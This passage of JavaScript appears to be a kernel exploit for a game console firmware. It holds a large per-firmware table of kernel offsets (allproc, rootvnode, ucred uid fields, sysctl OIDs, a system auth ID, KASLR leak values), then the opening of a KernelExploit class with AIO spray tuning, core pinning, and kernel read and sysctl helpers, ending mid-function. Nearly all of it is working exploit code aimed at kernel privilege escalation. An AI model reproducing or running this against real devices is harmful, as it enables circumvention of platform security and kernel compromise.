                    retStatic: 0xb6ec71,
                    retLow16: 0xec71,
                },
                oid: {
                    originalKind: 0x80048002,
                    writableKind: 0x70048002,
                    a: {
                        base: 0x294b408,
                        kind: 0x294b41c,
                        kindByte3: 0x294b41f,
                        arg1: 0x294b420,
                        arg1Byte1: 0x294b421,
                        arg1Value: 0x294b3f8,
                        deadSink: 0x294b428,
                    },
                    b: {
                        base: 0x294b2e0,
                        kind: 0x294b2f4,
                        kindByte3: 0x294b2f7,
                        arg1: 0x294b2f8,
                        arg1Value: 0x294b210,
                        visible: 0x294b330,
                    },
                    c: {
                        base: 0x2c6e108,
                        kind: 0x2c6e11c,
                        arg1: 0x2c6e120,
                        arg1Value: 0x3da32bc,
                        mib: [0x9, 0x8],
                    },
                },
                walkCounter: {
                    addr: 0x3da32b8,
                    mib: [0x9, 0x7],
                },
                nodeMutex: 0x1b1ab78,
                rodataProbe: {
                    rva: 0x11c8da2,
                    text: "_aio_submit_cmd\u0000_aio_multi_wait",
                },
                aio: {
                    waiterSize: 0x38,
                    requestSize: 0x28,
                    group: {
                        num: 0x0,
                        state: 0x8,
                        waiters: 0x50,
                    },
                    idTable: {
                        pages: 0x220,
                        slotStride: 0x30,
                        entryType: 0x160,
                    },
                },
                proc: {
                    pid: 0xbc,
                    ucred: 0x40,
                    fd: 0x48,
                    aioInfo: 0xc48,
                    dynlib: 0x3e8,
                },
                kernelPid: 0x0,
                ucred: {
                    uid: 0x4,
                    ruid: 0x8,
                    svuid: 0xc,
                    ngroups: 0x10,
                    rgid: 0x14,
                    svgid: 0x18,
                    sceAuthId: 0x58,
                    sceCaps: 0x60,
                    sceCaps1: 0x68,
                    sceAttrs: 0x80,
                },
                sysCoreAuthId: {
                    lo: 0x7,
                    hi: 0x48000000,
                },
                filedesc: {
                    files: 0x0,
                    cdir: 0x8,
                    rdir: 0x10,
                    jdir: 0x18,
                },
                filedescTable: {
                    nfiles: 0x0,
                    ofiles: 0x8,
                    entryStride: 0x30,
                    fileData: 0x0,
                },
                pipe: {
                    count: 0x0,
                    in: 0x4,
                    out: 0x8,
                    size: 0xc,
                    buffer: 0x10,
                    pair: 0xe8,
                    defaultSize: 0x4000,
                },
                dynlib: {
                    syscallStart: 0xf0,
                    syscallEnd: 0xf8,
                    restrictFlags: 0x118,
                    libkernelRef: 0x18,
                },
            },
            "12.20": {
                firmware: "12.20",
                kernelData: 0xd50000,
                allproc: 0x35d5e00,
                rootvnode: 0x3e27510,
                kaslr: {
                    mode: "rtmsg2",
                    retStatic: 0xb6eaf1,
                    retLow16: 0xeaf1,
                },
                oid: {
                    originalKind: 0x80048002,
                    writableKind: 0x70048002,
                    a: {
                        base: 0x294b408,
                        kind: 0x294b41c,
                        kindByte3: 0x294b41f,
                        arg1: 0x294b420,
                        arg1Byte1: 0x294b421,
                        arg1Value: 0x294b3f8,
                        deadSink: 0x294b428,
                    },
                    b: {
                        base: 0x294b2e0,
                        kind: 0x294b2f4,
                        kindByte3: 0x294b2f7,
                        arg1: 0x294b2f8,
                        arg1Value: 0x294b210,
                        visible: 0x294b330,
                    },
                    c: {
                        base: 0x2c6e108,
                        kind: 0x2c6e11c,
                        arg1: 0x2c6e120,
                        arg1Value: 0x3da32bc,
                        mib: [0x9, 0x8],
                    },
                },
                walkCounter: {
                    addr: 0x3da32b8,
                    mib: [0x9, 0x7],
                },
                nodeMutex: 0x1b1ab78,
                rodataProbe: {
                    rva: 0x11c9013,
                    text: "_aio_submit_cmd\u0000_aio_multi_wait",
                },
                aio: {
                    waiterSize: 0x38,
                    requestSize: 0x28,
                    group: {
                        num: 0x0,
                        state: 0x8,
                        waiters: 0x50,
                    },
                    idTable: {
                        pages: 0x220,
                        slotStride: 0x30,
                        entryType: 0x160,
                    },
                },
                proc: {
                    pid: 0xbc,
                    ucred: 0x40,
                    fd: 0x48,
                    aioInfo: 0xc48,
                    dynlib: 0x3e8,
                },
                kernelPid: 0x0,
                ucred: {
                    uid: 0x4,
                    ruid: 0x8,
                    svuid: 0xc,
                    ngroups: 0x10,
                    rgid: 0x14,
                    svgid: 0x18,
                    sceAuthId: 0x58,
                    sceCaps: 0x60,
                    sceCaps1: 0x68,
                    sceAttrs: 0x80,
                },
                sysCoreAuthId: {
                    lo: 0x7,
                    hi: 0x48000000,
                },
                filedesc: {
                    files: 0x0,
                    cdir: 0x8,
                    rdir: 0x10,
                    jdir: 0x18,
                },
                filedescTable: {
                    nfiles: 0x0,
                    ofiles: 0x8,
                    entryStride: 0x30,
                    fileData: 0x0,
                },
                pipe: {
                    count: 0x0,
                    in: 0x4,
                    out: 0x8,
                    size: 0xc,
                    buffer: 0x10,
                    pair: 0xe8,
                    defaultSize: 0x4000,
                },
                dynlib: {
                    syscallStart: 0xf0,
                    syscallEnd: 0xf8,
                    restrictFlags: 0x118,
                    libkernelRef: 0x18,
                },
            },
            "12.40": {
                firmware: "12.40",
                kernelData: 0xd50000,
                allproc: 0x35d5e00,
                rootvnode: 0x3e27510,
                kaslr: {
                    mode: "rtmsg2",
                    retStatic: 0xb6eaf1,
                    retLow16: 0xeaf1,
                },
                oid: {
                    originalKind: 0x80048002,
                    writableKind: 0x70048002,
                    a: {
                        base: 0x294b408,
                        kind: 0x294b41c,
                        kindByte3: 0x294b41f,
                        arg1: 0x294b420,
                        arg1Byte1: 0x294b421,
                        arg1Value: 0x294b3f8,
                        deadSink: 0x294b428,
                    },
                    b: {
                        base: 0x294b2e0,
                        kind: 0x294b2f4,
                        kindByte3: 0x294b2f7,
                        arg1: 0x294b2f8,
                        arg1Value: 0x294b210,
                        visible: 0x294b330,
                    },
                    c: {
                        base: 0x2c6e108,
                        kind: 0x2c6e11c,
                        arg1: 0x2c6e120,
                        arg1Value: 0x3da32bc,
                        mib: [0x9, 0x8],
                    },
                },
                walkCounter: {
                    addr: 0x3da32b8,
                    mib: [0x9, 0x7],
                },
                nodeMutex: 0x1b1ab78,
                rodataProbe: {
                    rva: 0x11c8e15,
                    text: "_aio_submit_cmd\u0000_aio_multi_wait",
                },
                aio: {
                    waiterSize: 0x38,
                    requestSize: 0x28,
                    group: {
                        num: 0x0,
                        state: 0x8,
                        waiters: 0x50,
                    },
                    idTable: {
                        pages: 0x220,
                        slotStride: 0x30,
                        entryType: 0x160,
                    },
                },
                proc: {
                    pid: 0xbc,
                    ucred: 0x40,
                    fd: 0x48,
                    aioInfo: 0xc48,
                    dynlib: 0x3e8,
                },
                kernelPid: 0x0,
                ucred: {
                    uid: 0x4,
                    ruid: 0x8,
                    svuid: 0xc,
                    ngroups: 0x10,
                    rgid: 0x14,
                    svgid: 0x18,
                    sceAuthId: 0x58,
                    sceCaps: 0x60,
                    sceCaps1: 0x68,
                    sceAttrs: 0x80,
                },
                sysCoreAuthId: {
                    lo: 0x7,
                    hi: 0x48000000,
                },
                filedesc: {
                    files: 0x0,
                    cdir: 0x8,
                    rdir: 0x10,
                    jdir: 0x18,
                },
                filedescTable: {
                    nfiles: 0x0,
                    ofiles: 0x8,
                    entryStride: 0x30,
                    fileData: 0x0,
                },
                pipe: {
                    count: 0x0,
                    in: 0x4,
                    out: 0x8,
                    size: 0xc,
                    buffer: 0x10,
                    pair: 0xe8,
                    defaultSize: 0x4000,
                },
                dynlib: {
                    syscallStart: 0xf0,
                    syscallEnd: 0xf8,
                    restrictFlags: 0x118,
                    libkernelRef: 0x18,
                },
            },
            "12.60": {
                firmware: "12.60",
                kernelData: 0xd50000,
                allproc: 0x35d5e00,
                rootvnode: 0x3e27510,
                kaslr: {
                    mode: "rtmsg2",
                    retStatic: 0xb6eb51,
                    retLow16: 0xeb51,
                },
                oid: {
                    originalKind: 0x80048002,
                    writableKind: 0x70048002,
                    a: {
                        base: 0x294b408,
                        kind: 0x294b41c,
                        kindByte3: 0x294b41f,
                        arg1: 0x294b420,
                        arg1Byte1: 0x294b421,
                        arg1Value: 0x294b3f8,
                        deadSink: 0x294b428,
                    },
                    b: {
                        base: 0x294b2e0,
                        kind: 0x294b2f4,
                        kindByte3: 0x294b2f7,
                        arg1: 0x294b2f8,
                        arg1Value: 0x294b210,
                        visible: 0x294b330,
                    },
                    c: {
                        base: 0x2c6e108,
                        kind: 0x2c6e11c,
                        arg1: 0x2c6e120,
                        arg1Value: 0x3da32bc,
                        mib: [0x9, 0x8],
                    },
                },
                walkCounter: {
                    addr: 0x3da32b8,
                    mib: [0x9, 0x7],
                },
                nodeMutex: 0x1b1ab78,
                rodataProbe: {
                    rva: 0x11c8e92,
                    text: "_aio_submit_cmd\u0000_aio_multi_wait",
                },
                aio: {
                    waiterSize: 0x38,
                    requestSize: 0x28,
                    group: {
                        num: 0x0,
                        state: 0x8,
                        waiters: 0x50,
                    },
                    idTable: {
                        pages: 0x220,
                        slotStride: 0x30,
                        entryType: 0x160,
                    },
                },
                proc: {
                    pid: 0xbc,
                    ucred: 0x40,
                    fd: 0x48,
                    aioInfo: 0xc48,
                    dynlib: 0x3e8,
                },
                kernelPid: 0x0,
                ucred: {
                    uid: 0x4,
                    ruid: 0x8,
                    svuid: 0xc,
                    ngroups: 0x10,
                    rgid: 0x14,
                    svgid: 0x18,
                    sceAuthId: 0x58,
                    sceCaps: 0x60,
                    sceCaps1: 0x68,
                    sceAttrs: 0x80,
                },
                sysCoreAuthId: {
                    lo: 0x7,
                    hi: 0x48000000,
                },
                filedesc: {
                    files: 0x0,
                    cdir: 0x8,
                    rdir: 0x10,
                    jdir: 0x18,
                },
                filedescTable: {
                    nfiles: 0x0,
                    ofiles: 0x8,
                    entryStride: 0x30,
                    fileData: 0x0,
                },
                pipe: {
                    count: 0x0,
                    in: 0x4,
                    out: 0x8,
                    size: 0xc,
                    buffer: 0x10,
                    pair: 0xe8,
                    defaultSize: 0x4000,
                },
                dynlib: {
                    syscallStart: 0xf0,
                    syscallEnd: 0xf8,
                    restrictFlags: 0x118,
                    libkernelRef: 0x18,
                },
            },
            "12.70": {
                firmware: "12.70",
                kernelData: 0xd50000,
                allproc: 0x35d5e00,
                rootvnode: 0x3e27510,
                kaslr: {
                    mode: "rtmsg2",
                    retStatic: 0xb6eb51,
                    retLow16: 0xeb51,
                },
                oid: {
                    originalKind: 0x80048002,
                    writableKind: 0x70048002,
                    a: {
                        base: 0x294b408,
                        kind: 0x294b41c,
                        kindByte3: 0x294b41f,
                        arg1: 0x294b420,
                        arg1Byte1: 0x294b421,
                        arg1Value: 0x294b3f8,
                        deadSink: 0x294b428,
                    },
                    b: {
                        base: 0x294b2e0,
                        kind: 0x294b2f4,
                        kindByte3: 0x294b2f7,
                        arg1: 0x294b2f8,
                        arg1Value: 0x294b210,
                        visible: 0x294b330,
                    },
                    c: {
                        base: 0x2c6e108,
                        kind: 0x2c6e11c,
                        arg1: 0x2c6e120,
                        arg1Value: 0x3da32bc,
                        mib: [0x9, 0x8],
                    },
                },
                walkCounter: {
                    addr: 0x3da32b8,
                    mib: [0x9, 0x7],
                },
                nodeMutex: 0x1b1ab78,
                rodataProbe: {
                    rva: 0x11c86d5,
                    text: "_aio_submit_cmd\u0000_aio_multi_wait",
                },
                aio: {
                    waiterSize: 0x38,
                    requestSize: 0x28,
                    group: {
                        num: 0x0,
                        state: 0x8,
                        waiters: 0x50,
                    },
                    idTable: {
                        pages: 0x220,
                        slotStride: 0x30,
                        entryType: 0x160,
                    },
                },
                proc: {
                    pid: 0xbc,
                    ucred: 0x40,
                    fd: 0x48,
                    aioInfo: 0xc48,
                    dynlib: 0x3e8,
                },
                kernelPid: 0x0,
                ucred: {
                    uid: 0x4,
                    ruid: 0x8,
                    svuid: 0xc,
                    ngroups: 0x10,
                    rgid: 0x14,
                    svgid: 0x18,
                    sceAuthId: 0x58,
                    sceCaps: 0x60,
                    sceCaps1: 0x68,
                    sceAttrs: 0x80,
                },
                sysCoreAuthId: {
                    lo: 0x7,
                    hi: 0x48000000,
                },
                filedesc: {
                    files: 0x0,
                    cdir: 0x8,
                    rdir: 0x10,
                    jdir: 0x18,
                },
                filedescTable: {
                    nfiles: 0x0,
                    ofiles: 0x8,
                    entryStride: 0x30,
                    fileData: 0x0,
                },
                pipe: {
                    count: 0x0,
                    in: 0x4,
                    out: 0x8,
                    size: 0xc,
                    buffer: 0x10,
                    pair: 0xe8,
                    defaultSize: 0x4000,
                },
                dynlib: {
                    syscallStart: 0xf0,
                    syscallEnd: 0xf8,
                    restrictFlags: 0x118,
                    libkernelRef: 0x18,
                },
            },
            "13.00": {
                firmware: "13.00",
                kernelData: 0xcb0000,
                allproc: 0x3575e00,
                rootvnode: 0x3de3510,
                kaslr: {
                    mode: "rtmsg2",
                    retStatic: 0xad8582,
                    retLow16: 0x8582,
                },
                oid: {
                    originalKind: 0x80048002,
                    writableKind: 0x70048002,
                    a: {
                        base: 0x28bec88,
                        kind: 0x28bec9c,
                        kindByte3: 0x28bec9f,
                        arg1: 0x28beca0,
                        arg1Byte1: 0x28beca1,
                        arg1Value: 0x28bec78,
                        deadSink: 0x28beca8,
                    },
                    b: {
                        base: 0x28beb60,
                        kind: 0x28beb74,
                        kindByte3: 0x28beb77,
                        arg1: 0x28beb78,
                        arg1Value: 0x28bea90,
                        visible: 0x28bebb0,
                    },
                    c: {
                        base: 0x2be1958,
                        kind: 0x2be196c,
                        arg1: 0x2be1970,
                        arg1Value: 0x3d5e73c,
                        mib: [0x9, 0x8],
                    },
                },
                walkCounter: {
                    addr: 0x3d5e738,
                    mib: [0x9, 0x7],
                },
                nodeMutex: 0x1a8ba78,
                rodataProbe: {
                    rva: 0x13678a5,
                    text: "_aio_submit_cmd\u0000_aio_multi_wait",
                },
                aio: {
                    waiterSize: 0x38,
                    requestSize: 0x28,
                    group: {
                        num: 0x0,
                        state: 0x8,
                        waiters: 0x50,
                    },
                    idTable: {
                        pages: 0x220,
                        slotStride: 0x30,
                        entryType: 0x160,
                    },
                },
                proc: {
                    pid: 0xbc,
                    ucred: 0x40,
                    fd: 0x48,
                    aioInfo: 0xc48,
                    dynlib: 0x3e8,
                },
                kernelPid: 0x0,
                ucred: {
                    uid: 0x4,
                    ruid: 0x8,
                    svuid: 0xc,
                    ngroups: 0x10,
                    rgid: 0x14,
                    svgid: 0x18,
                    sceAuthId: 0x58,
                    sceCaps: 0x60,
                    sceCaps1: 0x68,
                    sceAttrs: 0x80,
                },
                sysCoreAuthId: {
                    lo: 0x7,
                    hi: 0x48000000,
                },
                filedesc: {
                    files: 0x0,
                    cdir: 0x8,
                    rdir: 0x10,
                    jdir: 0x18,
                },
                filedescTable: {
                    nfiles: 0x0,
                    ofiles: 0x8,
                    entryStride: 0x30,
                    fileData: 0x0,
                },
                pipe: {
                    count: 0x0,
                    in: 0x4,
                    out: 0x8,
                    size: 0xc,
                    buffer: 0x10,
                    pair: 0xe8,
                    defaultSize: 0x4000,
                },
                dynlib: {
                    syscallStart: 0xf0,
                    syscallEnd: 0xf8,
                    restrictFlags: 0x118,
                    libkernelRef: 0x18,
                },
            },
            "13.20": {
                firmware: "13.20",
                kernelData: 0xcb0000,
                allproc: 0x3575e00,
                rootvnode: 0x3de3510,
                kaslr: {
                    mode: "rtmsg2",
                    retStatic: 0xad8790,
                    retLow16: 0x8790,
                },
                oid: {
                    originalKind: 0x80048002,
                    writableKind: 0x70048002,
                    a: {
                        base: 0x28bec88,
                        kind: 0x28bec9c,
                        kindByte3: 0x28bec9f,
                        arg1: 0x28beca0,
                        arg1Byte1: 0x28beca1,
                        arg1Value: 0x28bec78,
                        deadSink: 0x28beca8,
                    },
                    b: {
                        base: 0x28beb60,
                        kind: 0x28beb74,
                        kindByte3: 0x28beb77,
                        arg1: 0x28beb78,
                        arg1Value: 0x28bea90,
                        visible: 0x28bebb0,
                    },
                    c: {
                        base: 0x2be1958,
                        kind: 0x2be196c,
                        arg1: 0x2be1970,
                        arg1Value: 0x3d5e73c,
                        mib: [0x9, 0x8],
                    },
                },
                walkCounter: {
                    addr: 0x3d5e738,
                    mib: [0x9, 0x7],
                },
                nodeMutex: 0x1a8ba78,
                rodataProbe: {
                    rva: 0x1367c97,
                    text: "_aio_submit_cmd\u0000_aio_multi_wait",
                },
                aio: {
                    waiterSize: 0x38,
                    requestSize: 0x28,
                    group: {
                        num: 0x0,
                        state: 0x8,
                        waiters: 0x50,
                    },
                    idTable: {
                        pages: 0x220,
                        slotStride: 0x30,
                        entryType: 0x160,
                    },
                },
                proc: {
                    pid: 0xbc,
                    ucred: 0x40,
                    fd: 0x48,
                    aioInfo: 0xc48,
                    dynlib: 0x3e8,
                },
                kernelPid: 0x0,
                ucred: {
                    uid: 0x4,
                    ruid: 0x8,
                    svuid: 0xc,
                    ngroups: 0x10,
                    rgid: 0x14,
                    svgid: 0x18,
                    sceAuthId: 0x58,
                    sceCaps: 0x60,
                    sceCaps1: 0x68,
                    sceAttrs: 0x80,
                },
                sysCoreAuthId: {
                    lo: 0x7,
                    hi: 0x48000000,
                },
                filedesc: {
                    files: 0x0,
                    cdir: 0x8,
                    rdir: 0x10,
                    jdir: 0x18,
                },
                filedescTable: {
                    nfiles: 0x0,
                    ofiles: 0x8,
                    entryStride: 0x30,
                    fileData: 0x0,
                },
                pipe: {
                    count: 0x0,
                    in: 0x4,
                    out: 0x8,
                    size: 0xc,
                    buffer: 0x10,
                    pair: 0xe8,
                    defaultSize: 0x4000,
                },
                dynlib: {
                    syscallStart: 0xf0,
                    syscallEnd: 0xf8,
                    restrictFlags: 0x118,
                    libkernelRef: 0x18,
                },
            },
            "13.40": {
                firmware: "13.40",
                kernelData: 0xcb0000,
                allproc: 0x3579e80,
                rootvnode: 0x3de7510,
                kaslr: {
                    mode: "rtmsg2",
                    retStatic: 0xad8aa0,
                    retLow16: 0x8aa0,
                },
                oid: {
                    originalKind: 0x80048002,
                    writableKind: 0x70048002,
                    a: {
                        base: 0x28bee88,
                        kind: 0x28bee9c,
                        kindByte3: 0x28bee9f,
                        arg1: 0x28beea0,
                        arg1Byte1: 0x28beea1,
                        arg1Value: 0x28bee78,
                        deadSink: 0x28beea8,
                    },
                    b: {
                        base: 0x28bed60,
                        kind: 0x28bed74,
                        kindByte3: 0x28bed77,
                        arg1: 0x28bed78,
                        arg1Value: 0x28bec90,
                        visible: 0x28bedb0,
                    },
                    c: {
                        base: 0x2be1b58,
                        kind: 0x2be1b6c,
                        arg1: 0x2be1b70,
                        arg1Value: 0x3d6273c,
                        mib: [0x9, 0x8],
                    },
                },
                walkCounter: {
                    addr: 0x3d62738,
                    mib: [0x9, 0x7],
                },
                nodeMutex: 0x1a8bab8,
                rodataProbe: {
                    rva: 0x1367a24,
                    text: "_aio_submit_cmd\u0000_aio_multi_wait",
                },
                aio: {
                    waiterSize: 0x38,
                    requestSize: 0x28,
                    group: {
                        num: 0x0,
                        state: 0x8,
                        waiters: 0x50,
                    },
                    idTable: {
                        pages: 0x220,
                        slotStride: 0x30,
                        entryType: 0x160,
                    },
                },
                proc: {
                    pid: 0xbc,
                    ucred: 0x40,
                    fd: 0x48,
                    aioInfo: 0xc48,
                    dynlib: 0x3e8,
                },
                kernelPid: 0x0,
                ucred: {
                    uid: 0x4,
                    ruid: 0x8,
                    svuid: 0xc,
                    ngroups: 0x10,
                    rgid: 0x14,
                    svgid: 0x18,
                    sceAuthId: 0x58,
                    sceCaps: 0x60,
                    sceCaps1: 0x68,
                    sceAttrs: 0x80,
                },
                sysCoreAuthId: {
                    lo: 0x7,
                    hi: 0x48000000,
                },
                filedesc: {
                    files: 0x0,
                    cdir: 0x8,
                    rdir: 0x10,
                    jdir: 0x18,
                },
                filedescTable: {
                    nfiles: 0x0,
                    ofiles: 0x8,
                    entryStride: 0x30,
                    fileData: 0x0,
                },
                pipe: {
                    count: 0x0,
                    in: 0x4,
                    out: 0x8,
                    size: 0xc,
                    buffer: 0x10,
                    pair: 0xe8,
                    defaultSize: 0x4000,
                },
                dynlib: {
                    syscallStart: 0xf0,
                    syscallEnd: 0xf8,
                    restrictFlags: 0x118,
                    libkernelRef: 0x18,
                },
            },
            "13.42": {
                firmware: "13.42",
                kernelData: 0xcb0000,
                allproc: 0x3579e80,
                rootvnode: 0x3de7510,
                kaslr: {
                    mode: "rtmsg2",
                    retStatic: 0xad8aa0,
                    retLow16: 0x8aa0,
                },
                oid: {
                    originalKind: 0x80048002,
                    writableKind: 0x70048002,
                    a: {
                        base: 0x28bee88,
                        kind: 0x28bee9c,
                        kindByte3: 0x28bee9f,
                        arg1: 0x28beea0,
                        arg1Byte1: 0x28beea1,
                        arg1Value: 0x28bee78,
                        deadSink: 0x28beea8,
                    },
                    b: {
                        base: 0x28bed60,
                        kind: 0x28bed74,
                        kindByte3: 0x28bed77,
                        arg1: 0x28bed78,
                        arg1Value: 0x28bec90,
                        visible: 0x28bedb0,
                    },
                    c: {
                        base: 0x2be1b58,
                        kind: 0x2be1b6c,
                        arg1: 0x2be1b70,
                        arg1Value: 0x3d6273c,
                        mib: [0x9, 0x8],
                    },
                },
                walkCounter: {
                    addr: 0x3d62738,
                    mib: [0x9, 0x7],
                },
                nodeMutex: 0x1a8bab8,
                rodataProbe: {
                    rva: 0x1367e06,
                    text: "_aio_submit_cmd\u0000_aio_multi_wait",
                },
                aio: {
                    waiterSize: 0x38,
                    requestSize: 0x28,
                    group: {
                        num: 0x0,
                        state: 0x8,
                        waiters: 0x50,
                    },
                    idTable: {
                        pages: 0x220,
                        slotStride: 0x30,
                        entryType: 0x160,
                    },
                },
                proc: {
                    pid: 0xbc,
                    ucred: 0x40,
                    fd: 0x48,
                    aioInfo: 0xc48,
                    dynlib: 0x3e8,
                },
                kernelPid: 0x0,
                ucred: {
                    uid: 0x4,
                    ruid: 0x8,
                    svuid: 0xc,
                    ngroups: 0x10,
                    rgid: 0x14,
                    svgid: 0x18,
                    sceAuthId: 0x58,
                    sceCaps: 0x60,
                    sceCaps1: 0x68,
                    sceAttrs: 0x80,
                },
                sysCoreAuthId: {
                    lo: 0x7,
                    hi: 0x48000000,
                },
                filedesc: {
                    files: 0x0,
                    cdir: 0x8,
                    rdir: 0x10,
                    jdir: 0x18,
                },
                filedescTable: {
                    nfiles: 0x0,
                    ofiles: 0x8,
                    entryStride: 0x30,
                    fileData: 0x0,
                },
                pipe: {
                    count: 0x0,
                    in: 0x4,
                    out: 0x8,
                    size: 0xc,
                    buffer: 0x10,
                    pair: 0xe8,
                    defaultSize: 0x4000,
                },
                dynlib: {
                    syscallStart: 0xf0,
                    syscallEnd: 0xf8,
                    restrictFlags: 0x118,
                    libkernelRef: 0x18,
                },
            },
            "13.60": {
                firmware: "13.60",
                kernelData: 0xcc0000,
                allproc: 0x3589e80,
                rootvnode: 0x3e0b510,
                kaslr: {
                    mode: "rtmsg2",
                    retStatic: 0xae2da0,
                    retLow16: 0x2da0,
                },
                oid: {
                    originalKind: 0x80048002,
                    writableKind: 0x70048002,
                    a: {
                        base: 0x28cef68,
                        kind: 0x28cef7c,
                        kindByte3: 0x28cef7f,
                        arg1: 0x28cef80,
                        arg1Byte1: 0x28cef81,
                        arg1Value: 0x28cef58,
                        deadSink: 0x28cef88,
                    },
                    b: {
                        base: 0x28cee40,
                        kind: 0x28cee54,
                        kindByte3: 0x28cee57,
                        arg1: 0x28cee58,
                        arg1Value: 0x28ced70,
                        visible: 0x28cee90,
                    },
                    c: {
                        base: 0x2bf1c38,
                        kind: 0x2bf1c4c,
                        arg1: 0x2bf1c50,
                        arg1Value: 0x3d831bc,
                        mib: [0x9, 0x8],
                    },
                },
                walkCounter: {
                    addr: 0x3d831b8,
                    mib: [0x9, 0x7],
                },
                nodeMutex: 0x1a9bab8,
                rodataProbe: {
                    rva: 0x1379d6c,
                    text: "_aio_submit_cmd\u0000_aio_multi_wait",
                },
                aio: {
                    waiterSize: 0x38,
                    requestSize: 0x28,
                    group: {
                        num: 0x0,
                        state: 0x8,
                        waiters: 0x50,
                    },
                    idTable: {
                        pages: 0x220,
                        slotStride: 0x30,
                        entryType: 0x160,
                    },
                },
                proc: {
                    pid: 0xbc,
                    ucred: 0x40,
                    fd: 0x48,
                    aioInfo: 0xc48,
                    dynlib: 0x3e8,
                },
                kernelPid: 0x0,
                ucred: {
                    uid: 0x4,
                    ruid: 0x8,
                    svuid: 0xc,
                    ngroups: 0x10,
                    rgid: 0x14,
                    svgid: 0x18,
                    sceAuthId: 0x58,
                    sceCaps: 0x60,
                    sceCaps1: 0x68,
                    sceAttrs: 0x80,
                },
                sysCoreAuthId: {
                    lo: 0x7,
                    hi: 0x48000000,
                },
                filedesc: {
                    files: 0x0,
                    cdir: 0x8,
                    rdir: 0x10,
                    jdir: 0x18,
                },
                filedescTable: {
                    nfiles: 0x0,
                    ofiles: 0x8,
                    entryStride: 0x30,
                    fileData: 0x0,
                },
                pipe: {
                    count: 0x0,
                    in: 0x4,
                    out: 0x8,
                    size: 0xc,
                    buffer: 0x10,
                    pair: 0xe8,
                    defaultSize: 0x4000,
                },
                dynlib: {
                    syscallStart: 0xf0,
                    syscallEnd: 0xf8,
                    restrictFlags: 0x118,
                    libkernelRef: 0x18,
                },
            },
        };
        function pick_offsets(fw) {
            const known = Object.keys(KRW_TABLE);
            return {
                off: KRW_TABLE[fw] || null,
                known,
                hint: known.filter((k) => k.split(".")[0] === String(fw).split(".")[0]),
            };
        }
        const AF_UNIX = 1, AF_INET = 2, AF_ROUTE = 17, AF_INET6 = 28;
        const SOCK_STREAM = 1, SOCK_RAW = 3;
        const MSG_DONTWAIT = 0x80;
        const RLIMIT_NOFILE = 8;
        const CPU_LEVEL_WHICH = 3, CPU_WHICH_TID = 1;
        const RTP_SET = 1, PRI_REALTIME = 2, PRI_NORMAL = 3;
        const AIO_CMD_READ = 1;
        class KernelExploit {
          constructor(p, chain, log, off) {
            this.p = p;
            this.chain = chain;
            this.onScreen = typeof log === "function" ? log : () => {};
            this.off = off;
            this.handedOff = false;
            this.oidsRestored = false;
            this.disarmed = false;
            this.ebootOrig = null;
            this.ebootRestored = false;
            this.tuning = {
              waiters: 18,
              requests: 13,
              churnBefore: 32,
              churnAfter: 256,
              sprays: 64,
              workerBlockers: 24,
              waitTimeoutUs: 10000,
            };
            this.kbase = null;
            this.curproc = null;
            this.ucred = null;
            this.procFdAddr = null;
            this.master = null;
            this.victim = null;
            this.fds = [];
            this.windowHigh = 0xffffffff;
            this.armedGroups = [];
            this.scratch = {
              states: p.malloc(0x400, 1),
              qword: p.malloc(8, 1),
            };
          }
          report(tag, detail, type) {
            const label = String(tag);
            this.onScreen(detail ? label + ": " + detail : label, type);
          }
          async sysInt(number, ...args) {
            return (await this.chain.syscall(number, ...args)).low | 0;
          }
          readU8(base, offset) {
            return this.p.read1(base.add32(offset));
          }
          readU32(base, offset) {
            return this.p.read4(base.add32(offset));
          }
          readU64(base, offset) {
            return this.p.read8(base.add32(offset));
          }
          writeU8(base, offset, value) {
            this.p.write1(base.add32(offset), value & 0xff);
          }
          writeU32(base, offset, value) {
            this.p.write4(base.add32(offset), value >>> 0);
          }
          writeU64(base, offset, value) {
            this.p.write8(base.add32(offset), value);
          }
          alloc(size) {
            const buffer = this.p.malloc(size, 1);
            this.clear(buffer, size);
            return buffer;
          }
          clear(buffer, size) {
            for (let i = 0; i < size; i += 4) this.p.write4(buffer.add32(i), 0);
          }
          kaddr(rva) {
            return this.kbase.add32(rva);
          }
          isKernelPointer(value) {
            return !!value && value.hi >>> 16 === 0xffff && (value.low & 7) === 0 &&
              !(value.hi === 0xffffffff && value.low === 0xffffffff);
          }
          async readKernelPointer(address) {
            const { rv, value } = await this.kread64(address);
            return rv === 0 && this.isKernelPointer(value) ? value : null;
          }
          async pinToSingleCore() {
            const id = new int64(0xffffffff, 0xffffffff);
            const current = this.alloc(0x10);
            await this.sysInt(SYS_CPUSET_GETAFFINITY, CPU_LEVEL_WHICH, CPU_WHICH_TID, id, 0x10, current);
            const allowed = this.readU32(current, 0) >>> 0;
            this.allowedMask = allowed;
            let core = -1;
            for (let c = 0; c < 16 && core < 0; c++) if (allowed & (1 << c)) core = c;
            if (core < 0) {
              this.report("PIN", "no allowed core in mask 0x" + allowed.toString(16));
              return;
            }
            const mask = this.alloc(0x10);
            this.writeU8(mask, (core >> 3) & 0xf, 1 << (core & 7));
            await this.sysInt(SYS_CPUSET_SETAFFINITY, CPU_LEVEL_WHICH, CPU_WHICH_TID, id, 0x10, mask);
            const rtprio = this.alloc(0x10);
            this.writeU8(rtprio, 0, PRI_REALTIME);
            await this.sysInt(SYS_RTPRIO_THREAD, RTP_SET, 0, rtprio);
            this.pinnedCore = core;
          }
          async restoreThreadAttributes() {
            if (this.threadAttributesRestored) return;
            const id = new int64(0xffffffff, 0xffffffff);
            const want = this.allowedMask >>> 0 || 0xea00;
            const mask = this.alloc(0x10);
            this.writeU8(mask, 0, want & 0xff);
            this.writeU8(mask, 1, (want >>> 8) & 0xff);
            await this.sysInt(SYS_CPUSET_SETAFFINITY, CPU_LEVEL_WHICH, CPU_WHICH_TID, id, 0x10, mask);
            const rtprio = this.alloc(0x10);
            this.writeU8(rtprio, 0, PRI_NORMAL);
            await this.sysInt(SYS_RTPRIO_THREAD, RTP_SET, 0, rtprio);
            this.threadAttributesRestored = true;
          }
          async sysctl(mib, oldPtr, oldLen, newPtr, newLen) {
            const mibPtr = this.alloc(4 * mib.length + 8);
            mib.forEach((value, i) => this.writeU32(mibPtr, i * 4, value));
            const lenPtr = this.alloc(8);
            this.writeU32(lenPtr, 0, oldLen >>> 0);
            const rv = await this.sysInt(SYS___SYSCTL, mibPtr, mib.length, oldPtr || 0, oldPtr ? lenPtr : 0, newPtr || 0, newLen >>> 0);
            return { rv, len: oldPtr ? this.readU32(lenPtr, 0) >>> 0 : 0 };
          }
          async sysctlReadInt(mib) {
            const value = this.alloc(8);
            const { rv } = await this.sysctl(mib, value, 4, 0, 0);
